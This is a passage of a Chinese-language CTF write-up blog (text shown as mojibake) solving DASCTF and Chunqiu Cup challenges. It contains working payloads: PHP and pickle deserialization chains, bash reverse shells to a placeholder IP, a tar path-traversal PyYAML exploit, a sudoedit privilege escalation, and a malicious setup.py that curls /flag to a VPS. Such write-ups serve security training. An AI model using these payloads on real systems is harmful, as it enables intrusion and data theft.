0x974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361m = pow(c,d,n)x = bytes.fromhex(hex(m)[2:])print(x)# b&#x27;DASCTF&#123;0e287wQ\\x08R\\x17\\x00FGXYFZ\\x07V\\x03kIUCn\\x02VDg\\x01f\\x0cN&#x27; ç»“åˆå‹ç¼©åŒ…æ³¨é‡Šï¼Œå°†ç»“æœä¸å‹ç¼©åŒ…å¯†ç C0ngr4tulati0n5_y0u_fou^d_m3 é«˜ä½è¡¥ \\x00ï¼Œ å³å¯¹é½å¼‚æˆ–å¾—flagï¼šDASCTF&#123;0e2874af5e422482378640e61d919e9a&#125;ã€‚ â€‹ WEBD0nâ€™t pl4y g4m3!!! -FIX å°æ˜ä¸å°å¿ƒæ²‰è¿·âšªâšªçš„ä¸œè¥¿æŠŠæºç å’ŒçŒ«çŒ«æä¸¢äº†ï¼Œè¯·å¸®ä»–æ‰¾å›æ¥ã€‚è¯·è®¿é—®/p0p.php bpè®¿é—® /p0p.phpï¼Œæç¤ºï¼š# ./æœ‰hint.zipï¼Œ è®¿é—® hint.zip ï¼Œåœ¨çº¿å°Šå˜Ÿå‡å˜Ÿè§£ç ï¼Œå¾— flagåœ¨/tmp/catcatf1ag.txtã€‚ æŸ¥çœ‹é¦–é¡µå‘ç°ä½¿ç”¨äº†PHP Development Serverï¼Œå½“PHP&lt;=7.4.21æ—¶Development Serverå­˜åœ¨æºç æ³„éœ²æ¼æ´ï¼ˆCNVD-2023-05738ï¼‰ï¼Œè¯¥æ¼æ´æºäºphp cli server begin send staticåœ¨è§£æhttpè¯·æ±‚æ—¶å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´å°†ä¸¤ä¸ªè¯·æ±‚æ‹¼æ¥è‡³ä¸€ä¸ªhttpè¯·æ±‚ä¸­å¯¼è‡´æœåŠ¡å™¨å°†phpæ–‡ä»¶ä½œä¸ºé™æ€æ–‡ä»¶è¿”å›ã€‚ æ„é€ è¯·æ±‚èµ°ç§ï¼š 12345GET /p0p.php HTTP/1.1Host: tcp.cloud.dasctf.com:20294GET / HTTP/1.1 æ‹¿åˆ° p0p.php çš„æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phpheader(&quot;HTTP/1.1 302 found&quot;);header(&quot;Location:https://passer-by.com/pacman/&quot;);class Pro&#123; private $exp; private $rce2; public function __get($name) &#123; return $this-&gt;$rce2=$this-&gt;exp[$rce2]; &#125; public function __toString() &#123; call_user_func(&#x27;system&#x27;, &quot;cat /flag&quot;); &#125;&#125;class Yang&#123; public function __call($name, $ary) &#123; if ($this-&gt;key === true || $this-&gt;finish1-&gt;name) &#123; if ($this-&gt;finish-&gt;finish) &#123; call_user_func($this-&gt;now[$name], $ary[0]); &#125; &#125; &#125; public function ycb() &#123; $this-&gt;now = 0; return $this-&gt;finish-&gt;finish; &#125; public function __wakeup() &#123; $this-&gt;key = True; &#125;&#125;class Cheng&#123; private $finish; public $name; public function __get($value) &#123; return $this-&gt;$value = $this-&gt;name[$value]; &#125;&#125;class Bei&#123; public function __destruct() &#123; if ($this-&gt;CTF-&gt;ycb()) &#123; $this-&gt;fine-&gt;YCB1($this-&gt;rce, $this-&gt;rce1); &#125; &#125; public function __wakeup() &#123; $this-&gt;key = false; &#125;&#125;function prohib($a)&#123; $filter = &quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;; return preg_replace($filter,&#x27;&#x27;,$a);&#125;$a = $_POST[&quot;CTF&quot;];if (isset($a))&#123; unserialize(prohib($a));&#125;?&gt;# ./æœ‰hint.zip åˆ†ææ„é€ ååºåˆ—åŒ–é“¾ï¼Œç”± Bei:__destruct() å¼€å§‹ï¼Œè°ƒç”¨åˆ° Yang:__call() ä¸­çš„ call_user_func() å‡½æ•°RCEï¼š 1234567891011121314151617181920from phpserialize import serializeclass Yang: public_finish=1class Yang: public_finish=Yang()class Yang: public_finish=Yang() public_now=&#123;&#x27;YCB1&#x27;:&#x27;system&#x27;&#125; class Bei: public_CTF=Yang() public_fine=Yang() public_rce=&#x27;cat /tmp/catcatf1ag.txt&#x27;print(serialize(Bei()))# O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125; åŒå†™systemç»•è¿‡å…³é”®è¯è¿‡æ»¤ï¼ŒPOSTä¼ å‚ï¼š CTF=O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125; å¾—åˆ°flagï¼šDASCTF&#123;54675642781313253235583695043371&#125;ã€‚ â€‹ Serpent I have been endeavoring to Reduce my phobia of Serpents by learning more about them. Do not scan, note that there is a www.zip file under the website. å°è¯•è§£flask sessionï¼š flask-unsign --decode --cookie &#39;eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjAsIm5hbWUiOiJHV0hUIiwic2VjcmV0X2tleSI6IkdXSFR4Y3VMeGhWZVFBIn19.ZPLWRw.5YHps4KX1FfZNY5xe9-25Nckl7s&#39; å¾—ï¼š&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 0, &#39;name&#39;: &#39;GWHT&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125; åŒ…å«secret_keyï¼Œä¿®æ”¹ä¸ºï¼š&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;ï¼ŒåŠ å¯†åæ”¹cookieï¼š flask-unsign --sign --cookie &quot;&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;&quot; --secret &#39;GWHTxcuLxhVeQA&#39; å¾—åˆ°æç¤ºï¼šHello admin, welcome to /ppppppppppick1eã€‚ è®¿é—® ppppppppppick1e è·¯ç”±ï¼Œåœ¨Headerå‘ç°ï¼šHint: Source in /src0deï¼Œå¾—åˆ°æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435@app.route(&#x27;/src0de&#x27;)def src0de(): f = open(__file__, &#x27;r&#x27;) rsp = f.read() f.close() return rsp[rsp.index(&quot;@app.route(&#x27;/src0de&#x27;)&quot;):]@app.route(&#x27;/ppppppppppick1e&#x27;)def ppppppppppick1e(): try: username = &quot;admin&quot; rsp = make_response(&quot;Hello, %s &quot; % username) rsp.headers[&#x27;hint&#x27;] = &quot;Source in /src0de&quot; pick1e = request.cookies.get(&#x27;pick1e&#x27;) if pick1e is not None: pick1e = base64.b64decode(pick1e) else: return rsp if check(pick1e): pick1e = pickle.loads(pick1e) return &quot;Go for it!!!&quot; else: return &quot;No Way!!!&quot; except Exception as e: error_message = str(e) return error_message return rspclass GWHT(): def __init__(self): passif __name__ == &#x27;__main__&#x27;: app.run(&#x27;0.0.0.0&#x27;, port=80) pythonååºåˆ—åŒ–ï¼Œæµ‹è¯•å‘ç°ç¦ç”¨RæŒ‡ä»¤ï¼Œå‚è€ƒè¿™é‡Œä½¿ç”¨ä¸å¸¦RæŒ‡ä»¤çš„RCE payloadï¼š b&#39;\\x80\\x03c__main__\\nGWHT\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVbash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot;\\nb.&#39; base64ç¼–ç åç»™cookieä¸­çš„ pick1e èµ‹å€¼ï¼ŒæˆåŠŸåå¼¹shellã€‚ è¯»æ ¹ç›®å½•ä¸‹flagå‘ç°æ— æƒé™ï¼ŒæŸ¥çœ‹SUIDå¯æ‰§è¡Œæ–‡ä»¶ï¼š find / -perm -u=s -type f 2&gt;/dev/nullï¼Œ å‘ç° /usr/bin/python3.8ï¼Œæ‰§è¡Œ python3.8 -c &quot;print(open(&#39;/flag&#39;).read())&quot; è¯»åˆ°flagï¼šDASCTF&#123;62339708167284198788958643730094&#125;ã€‚ â€‹ ArkNights Fantasy world full of magic and dreamâ€¦â€¦â€¦â€¦â€¦. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import uuidfrom flask import *from werkzeug.utils import *app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] =str(uuid.uuid4()).replace(&quot;-&quot;,&quot;*&quot;)+&quot;Boogipopisweak&quot;@app.route(&#x27;/&#x27;)def index(): name=request.args.get(&quot;name&quot;,&quot;name&quot;) m1sery=[request.args.get(&quot;m1sery&quot;,&quot;Doctor.Boogipop&quot;)] if(session.get(&quot;name&quot;)==&quot;Dr.Boog1pop&quot;): blacklist=re.findall(&quot;/ba|sh|\\\\\\\\|\\[|]|#|system|&#x27;|\\&quot;/&quot;, name, re.IGNORECASE) if blacklist: return &quot;bad hacker no way&quot; exec(f&#x27;for [&#123;name&#125;] in [&#123;m1sery&#125;]:print(&quot;strange?&quot;)&#x27;) else: session[&#x27;name&#x27;] = &quot;Doctor&quot; return render_template(&quot;index.html&quot;,name=session.get(&quot;name&quot;))@app.route(&#x27;/read&#x27;)def read(): file = request.args.get(&#x27;file&#x27;) fileblacklist=re.findall(&quot;/flag|fl|ag/&quot;,file, re.IGNORECASE) if fileblacklist: return &quot;bad hacker!&quot; start=request.args.get(&quot;start&quot;,&quot;0&quot;) end=request.args.get(&quot;end&quot;,&quot;0&quot;) if start==&quot;0&quot; and end==&quot;0&quot;: return open(file,&quot;rb&quot;).read() else: start,end=int(start),int(end) f=open(file,&quot;rb&quot;) f.seek(start) data=f.read(end) return data@app.route(&quot;/&lt;path:path&gt;&quot;)def render_page(path): print(os.path.pardir) print(path) if not os.path.exists(&quot;templates/&quot; + path): return &quot;not found&quot;, 404 return render_template(path)if __name__==&#x27;__main__&#x27;: app.run( debug=False, host=&quot;0.0.0.0&quot; ) print(app.config[&#x27;SECRET_KEY&#x27;]) éé¢„æœŸï¼Œåˆ©ç”¨ read è·¯ç”±è¯»ç¯å¢ƒå˜é‡æ–‡ä»¶ /proc/1/environ æ–‡ä»¶æ‰¾åˆ°flagï¼š/read?file=/proc/1/environã€‚ DASFLAG=DASCTF&#123;67528847472042710457227886304140&#125; é¢„æœŸè§£åº”è¯¥æ˜¯åˆ†åˆ«é€šè¿‡ /proc/self/maps å’Œ /proc/self/mem è¯»å–å †æ ˆåˆ†å¸ƒå’Œå¯¹åº”ä½ç½®å†…å­˜æ•°æ®æ‹¿åˆ°SECRET_KEYå€¼ï¼Œå†ä¿®æ”¹flask sessionç»•é»‘åå•RCEã€‚ â€‹ ezyaml ç®€å•å¾—yaml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576# app.pyimport tarfilefrom flask import Flask, render_template, request, redirectfrom hashlib import md5import yamlimport osimport reapp = Flask(__name__)def waf(s): flag = True blacklist = [&#x27;bytes&#x27;,&#x27;eval&#x27;,&#x27;map&#x27;,&#x27;frozenset&#x27;,&#x27;popen&#x27;,&#x27;tuple&#x27;,&#x27;exec&#x27;,&#x27;\\\\&#x27;,&#x27;object&#x27;,&#x27;listitems&#x27;,&#x27;subprocess&#x27;,&#x27;object&#x27;,&#x27;apply&#x27;] for no in blacklist: if no.lower() in str(s).lower(): flag= False print(no) break return flagdef extractFile(filepath, type): extractdir = filepath.split(&#x27;.&#x27;)[0] if not os.path.exists(extractdir): os.makedirs(extractdir) if type == &#x27;tar&#x27;: tf = tarfile.TarFile(filepath) tf.extractall(extractdir) return tf.getnames()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def main(): fn = &#x27;uploads/&#x27; + md5().hexdigest() if not os.path.exists(fn): os.makedirs(fn) return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def upload(): if request.method == &#x27;GET&#x27;: return redirect(&#x27;/&#x27;) if request.method == &#x27;POST&#x27;: upFile = request.files[&#x27;file&#x27;] print(upFile) if re.search(r&quot;\\.\\.|/&quot;, upFile.filename, re.M|re.I) != None: return &quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot; savePath = f&quot;uploads/&#123;upFile.filename&#125;&quot; print(savePath) upFile.save(savePath) if tarfile.is_tarfile(savePath): zipDatas = extractFile(savePath, &#x27;tar&#x27;) return render_template(&#x27;result.html&#x27;, path=savePath, files=zipDatas) else: return f&quot;&lt;script&gt;alert(&#x27;&#123;upFile.filename&#125; upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;])def src(): if request.args: username = request.args.get(&#x27;username&#x27;) with open(f&#x27;config/&#123;username&#125;.yaml&#x27;, &#x27;rb&#x27;) as f: Config = yaml.load(f.read()) return render_template(&#x27;admin.html&#x27;, username=&quot;admin&quot;, message=&quot;success&quot;) else: return render_template(&#x27;index.html&#x27;)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8000) å¼€å§‹ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œæ ¹æ®æºç çŸ¥ upload è·¯ç”±çŸ¥å½“ä¸Šä¼ taråç¼€çš„æ–‡ä»¶æ—¶ï¼Œå›æ‰§è¡Œè§£å‹ä»£ç ï¼Œå°†æ–‡ä»¶è§£å‹åˆ°uploadsç›®å½•ä¸‹ï¼Œåˆ©ç”¨tarç›®å½•ç©¿è¶Šæ¼æ´ï¼Œå°†æ–‡ä»¶è§£å‹åˆ°configç›®å½•ä¸‹ï¼Œé…åˆä¸‹ä¸€æ­¥ src è·¯ç”±åŠŸèƒ½ä¸­å­˜åœ¨çš„PyYAMLæ¼æ´ï¼ˆCVE-2020-1747ï¼‰ï¼Œå®ç°RCEã€‚ ç”Ÿæˆtaræ–‡ä»¶ï¼š 123456789101112131415import tarfileimport iotar = tarfile.TarFile(r&#x27;1.tar&#x27;, &#x27;w&#x27;)info = tarfile.TarInfo(&quot;../../config/my.yaml&quot;)# åå¼¹shelldeserialization_payload = &quot;&quot;&quot;!!python/object/apply:os.system [&#x27;bash -c &quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1&quot;&#x27;]&quot;&quot;&quot;info.size=len(deserialization_payload)info.mode=0o777tar.addfile(info, io.BytesIO(deserialization_payload.encode()))tar.close() ä¸Šä¼ ï¼Œå›æ˜¾è§£å‹åˆ° ../../config/my.yamlï¼Œmy.yaml å·²åœ¨configç›®å½•ä¸‹ï¼Œå†è®¿é—® /src?username=my åå¼¹shellæˆåŠŸï¼Œæ‰§è¡Œ cat /fllaagg_here å¾—åˆ°flagï¼šDASCTF&#123;13247551631744504376506324559899&#125;ã€‚ â€‹ REVERSECSGO Letâ€™s Go!! goè¯­è¨€ç¨‹åºï¼Œæ‰¾åˆ°æœ€åæ¯”è¾ƒçš„base64å¯†æ–‡ä¸ºï¼š cPQebAcRp+n+ZeP+YePEWfP7bej4YefCYd/7cuP7WfcPb/URYeMRbesObi/= åŠ¨è°ƒåŠ å¯†å‡½æ•° fkReverse_() ï¼Œåœ¨ç è¡¨å˜é‡ fkReverse å¤„ä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•å¾—å®é™…ç è¡¨ï¼š LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJK base64è§£å¯†å¾—flagï¼šDASCTF&#123;73913519-A0A6-5575-0F10-DDCBF50FA8CA&#125;ã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ› æ˜¥å­£èµ›","slug":"match-2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›-æ˜¥å­£èµ›","date":"2023-05-19T10:13:55.000Z","updated":"2023-06-04T16:24:22.895Z","comments":true,"path":"2023/05/19/match-2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›-æ˜¥å­£èµ›/","permalink":"https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/","excerpt":"","text":"â€‹ 2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›æ˜¥å­£èµ›ï¼Œå°†æ›´åŠ æ·±åŒ–äººæ‰åŸ¹å…»çš„æ„ä¹‰ï¼Œç»™äºˆæ–°ç”Ÿä»£é€‰æ‰‹æ›´å¤§çš„èˆå°ï¼Œæœ¬æ¬¡æ¯”èµ›ç‰¹å°†æ—¶é•¿å»¶é•¿è‡³7å¤©ï¼Œç›¸å¯¹äºä»¥å¾€çš„æ¯”èµ›ï¼Œè¿™æ˜¯ä¸€æ¬¡å‰æ‰€æœªæœ‰çš„å°è¯•ã€‚åŒæ—¶ï¼Œèµ›é¢˜éš¾åº¦åˆ†å¸ƒæ›´åŠ åˆç†å‡è¡¡ï¼Œé¢˜ç›®è´¨é‡ä¾æ—§å€¼å¾—è®©äººæœŸå¾…ã€‚é¢˜ç›®è®¾è®¡æ¶µç›–äº†å¤šä¸ªæ–¹é¢çš„å®‰å…¨æŠ€æœ¯ï¼Œèµ›é¢˜è€ƒé¢˜èŒƒå›´åŒ…æ‹¬Web æ¼æ´ä¸æ¸—é€(Web)ï¼Œè½¯ä»¶é€†å‘ (Reverse Engineering)ï¼ŒäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å’Œåˆ©ç”¨(PWN)ï¼Œå¯†ç å­¦ï¼ˆcryptoï¼‰ï¼Œä¸æ‚é¡¹ï¼ˆMiscï¼‰äº”å¤§ç±»å‹ï¼Œä¸”æ¯ä¸ªæ–¹å‘æ¯å¤©å„æ”¾ä¸€é“é¢˜ç›®ï¼ˆç¬¬ä¸ƒå¤©ä¸æ”¾é¢˜ï¼‰ã€‚åŒæ—¶æˆ‘ä»¬è¿˜åŠ å…¥äº†å½©è›‹é¢˜ç›®ï¼Œå¸Œæœ›å„ä½å‚èµ›é€‰æ‰‹ç©çš„å¼€å¿ƒï¼Œåœ¨æ¯”èµ›ä¸­å¯ä»¥æœ‰æ‰€æ”¶è·ï¼Œå¸Œæœ›é€šè¿‡æ˜¥ç§‹æ¯èƒ½å¤Ÿè®©å„ä½æ„Ÿå—åˆ°æ¯”èµ›çš„ä¹è¶£ä»¥åŠæ˜¥ç§‹GAMEçš„ç”¨å¿ƒï¼Œæ¬¢è¿å„ä½å¸ˆå‚…å‰æ¥æŒ‘æˆ˜ã€‚ä¸ºä½¿æ¯”èµ›æ›´çº¯ç²¹ï¼Œæ›´å…¬å¹³ï¼Œæ›´é«˜è´¨é‡ï¼Œæˆ‘ä»¬å–æ¶ˆäº†å¥–é‡‘å¥–åŠ±ï¼Œå¹¶é…å¤‡äº†äº”å¤§æ–¹å‘çš„é«˜è´¨é‡èµ›é¢˜ã€‚æ²¡æœ‰ååˆ©ï¼Œæ›´åŠ å…¬å¹³ï¼Œå……åˆ†è€ƒå¯Ÿé€‰æ‰‹çš„ç»¼åˆèƒ½åŠ›ã€‚ Rank: 13 MISCsudo å°æ¥ æ¥ æ˜¯ä¸€ä¸ªçƒ­çˆ±æŠ€æœ¯çš„å°å§‘å¨˜ï¼Œæœ€è¿‘å¼€å§‹å­¦ä¹ Linuxç³»ç»Ÿä¸­çš„sudoå‘½ä»¤ï¼Œå¸Œæœ›èƒ½å¤Ÿæ›´å¥½åœ°ç®¡ç†ç³»ç»Ÿã€‚ç„¶è€Œï¼Œå¥¹å¹¶ä¸çŸ¥é“åœ¨ä½¿ç”¨sudoæ—¶å­˜åœ¨ç€æ½œåœ¨çš„ç½‘ç»œå®‰å…¨éšæ‚£ï¼Œè¿™å¯èƒ½ä¼šç»™ç³»ç»Ÿå¸¦æ¥ä¸å¿…è¦çš„é£é™©ã€‚å› æ­¤ï¼Œå¥¹å†³å®šè¿›ä¸€æ­¥å­¦ä¹ æœ‰å…³ç½‘ç»œå®‰å…¨çš„çŸ¥è¯†ï¼Œä»¥æ›´å¥½åœ°ä¿æŠ¤ç³»ç»Ÿå’Œæ•°æ®çš„å®‰å…¨ã€‚å°æ¥ æ¥ ç›¸ä¿¡ï¼Œåªæœ‰ä¸æ–­å­¦ä¹ å’Œæé«˜è‡ªå·±çš„æŠ€èƒ½ï¼Œæ‰èƒ½æˆä¸ºä¸€åçœŸæ­£çš„æŠ€æœ¯ä¸“å®¶ã€‚ sshè¿æ¥ä¸Šï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰flagï¼Œä½†éœ€è¦rootæƒé™ï¼Œæ ¹æ®é¢˜ç›®æè¿°åº”è¯¥ä¸ºsudoææƒï¼Œå‚è€ƒ ã€æƒé™æå‡ã€‘Linux Sudoæƒé™æå‡æ¼æ´(CVE-2023-22809)ã€‚ sudo -l æŸ¥çœ‹NOPASSWDç‰¹æ®Šæƒé™ï¼ˆå¯¹åº” /etc/sudoer.d æ–‡ä»¶ï¼‰ï¼š 12345Matching Defaults entries for xiaonannan on engine-1: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser xiaonannan may run the following commands on engine-1: (ALL : ALL) NOPASSWD: sudoedit /etc/GAMELAB æ•… /etc/GAMELAB æœ‰ç‰¹æ®Šæƒé™ï¼Œè€Œç¯å¢ƒæ— vimæœ‰nanoï¼Œå°è¯•payloadï¼š EDITOR=&quot;nano -- /flag&quot; sudoedit /etc/GAMELAB å³å¯åœ¨nanoç¼–è¾‘æ¨¡å¼ä¸‹å¾—åˆ°flagã€‚ â€‹ piphack å¯ä»¥å®‰è£…ä»»æ„åŒ…çš„æ¥å£ï¼Œä½ ä¼šæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ ç»™äº†ä¸€ä¸ªå¯ä»¥å®‰è£…ä»»æ„åŒ…çš„æ¥å£ï¼Œå¯»æ‰¾åˆ°pipç›¸å…³çš„ææƒæ–¹æ³•ï¼šhttps://www.cnblogs.com/zlgxzswjy/p/10245977.htmlï¼Œå‚ç…§ç€FakePipçš„æ–¹æ³•åˆ¶ä½œ setup.py å¹¶æ‰“åŒ…æˆwhlæ–‡ä»¶æ”¾åˆ°vpsä¸Šï¼Œä½†æ€ä¹ˆè¯•ä¹Ÿæ²¡æˆåŠŸåå¼¹shellã€‚ å°è¯•å‡ºç”¨å¦ä¸€ç§gitæ–¹æ³•åŒæ ·å¯ä»¥ä»åº“ä¸­æ‹‰å–æ¶æ„è„šæœ¬è¯»å–flagã€‚ åœ¨vpsä¸Šç”¨pythonæ­å»ºæœåŠ¡å™¨ï¼špython3 -m http.server 10010 åˆ¶ä½œæ¶æ„è„šæœ¬ï¼š 123import osf = open(&#x27;/flag&#x27;, &#x27;r&#x27;).read()os.system(&#x27;curl http://vps-ip:10010?&#x27;+f) æ”¾åˆ°giteeæ–°å»ºçš„ä»“åº“é‡Œï¼Œå†å®‰è£…ä»»æ„åŒ…çš„è¾“å…¥å‡ºè¾“å…¥ï¼šgit+https://gitee.com/lazzzaro/test.git å³å¯è¿è¡Œåº“é‡Œçš„ setup.pyï¼Œåœ¨vpså†…å¯ä»¥çœ‹åˆ°å¤–å¸¦çš„flagï¼š â€‹ wordle åšé¢˜ç´¯äº†ï¼Œä¸å¦‚è·Ÿå°æ¥ æ¥ ä¸€èµ·æ¥ç©ä¸€ä¸ªwordleæ¸¸æˆï¼Œè¾¹ç©è¾¹å­¦è‹±æ–‡ï¼Œä¸€ä¸¾ä¸¤å¾—ã€‚ ï¼ˆçº¯æ¸¸æˆï¼Œé€šå…³å³æ‹¿flagï¼‰ wordleçŒœè¯æ¸¸æˆï¼Œ6æ¬¡å†…çŒœå¯¹ä¸€ä¸ª5å­—æ¯å•è¯å³å¯æ‹¿åˆ°flagã€‚é€åˆ†ã€‚ â€‹ happy2forensics å°æ¥ æ¥ æ˜æ˜çœ‹åˆ°äº†flagï¼Œæ€ä¹ˆæ‰“å¼€æ–‡ä»¶å´æ‰¾ä¸åˆ°å‘¢? æŸ¥çœ‹æµé‡åŒ…é‡Œhttpå¯¹è±¡ï¼Œå¯¼å‡º secret.rarï¼Œè§£å‹å‡º secret.vhdxï¼Œæ˜¯ä¸€ä¸ªbitlockeråŠ å¯†çš„ç£ç›˜ã€‚ æ ¹æ®å®˜æ–¹æç¤ºæ•è·æºç«¯å£ä¸º20ï¼Œç›®çš„ç«¯å£ä¸º80çš„TCPæµé‡ï¼Œå¯ä»¥è·å¾—bitlockerå¯†ç ï¼š bitlocker 120483-350966-299189-055297-225478-133463-431684-359403 åœ¨å›æ”¶ç«™æ‰¾åˆ° flag2.zip ä½†éœ€è¦å¯†ç ã€‚ å°†æ‰€æœ‰å°å›¾ç‰‡æ‹¼æ¥å¾—åˆ° password: 856a-a56b6a705653ï¼Œè§£å‹ flag2.zip å¾—åˆ° flag2:-919c-a140d7054ac5ã€‚ ä¸€å †å°å›¾ç‰‡ä¸­æœ‰ä¸€ä¸ªä¸ä¸€æ ·å¤§å°çš„å›¾ç‰‡ 210-1.pngï¼Œbinwalkåˆ†è§£ï¼Œåˆ†è§£å‡ºçš„jpgçš„APP1å—é‡Œè—æœ‰å¦ä¸€ä¸ª FFD8 å¤´ï¼Œæå–å‡ºæ–°çš„jpgï¼Œå¾—åˆ° flag1:f97d5b05-d312-46acã€‚ åˆå¹¶ï¼Œflagï¼šflag&#123;f97d5b05-d312-46ac-919c-a140d7054ac5&#125;ã€‚ â€‹ ç›²äººéšè—äº†èµ·æ¥12å’Œ34åšå¯¹æ¯”ï¼Œå‘ç°12ç›¸æ¯”34å°‘äº†38ä¸ªå­—èŠ‚ï¼Œå¯¹ç…§è¡¥å……å­—èŠ‚æ‰“å¼€12.mp4ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼šChunJiSai7k7kbibi@!ã€‚ è§£å‹ flag.zip å¾—åˆ° flag.pngï¼Œåœ¨å°¾éƒ¨å‘ç° keyischunqiu123ï¼ŒzstegæŸ¥çœ‹pngå›¾ç‰‡çš„lsbï¼Œå‘ç°åœ¨ b1,bgr,lsb,xy å¯ä»¥ç›´æ¥çœ‹åˆ°flagï¼š 12345b1,bgr,lsb,xy .. &lt;wbStego size=84, ext=&quot;\\x00fl&quot;, data=&quot;ag&#123;2c8ba89&quot;..., even=false&gt; 00000000: 54 00 00 00 66 6c 61 67 7b 32 63 38 62 61 38 39 |T...flag&#123;2c8ba89| 00000010: 37 2d 30 32 30 35 2d 39 62 66 66 2d 31 32 33 64 |7-0205-9bff-123d| 00000020: 2d 32 38 31 64 31 32 61 32 34 63 33 38 7d ff ff |-281d12a24c38&#125;..| 00000030: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |................| flagï¼šflag&#123;2c8ba897-0205-9bff-123d-281d12a24c38&#125;ã€‚ â€‹ 58ä¸64 å¥½å¤šæ–‡ä»¶..å¾—æƒ³åŠæ³•æŠŠä»–ä»¬å¼„åœ¨ä¸€èµ· 14268ä¸ªtxtæ–‡ä»¶ï¼Œæ¯ä¸ªtxtæ–‡ä»¶å†…ä¿å­˜çš„ä¸ºbase58ç»“æœï¼Œè§£ç åå†è¿æ¥æˆå­—ç¬¦ä¸²ï¼Œå¤šæ¬¡base64è§£ç å³å¯ã€‚ 123456789101112131415import base64import base58s = b&#x27;&#x27;for i in range(14268): f = open(f&#x27;tmp/&#123;i&#125;.txt&#x27;,&#x27;r&#x27;).readline().strip() s += base58.b58decode(f)for i in range(20): s = base64.b64decode(s)print(s)# 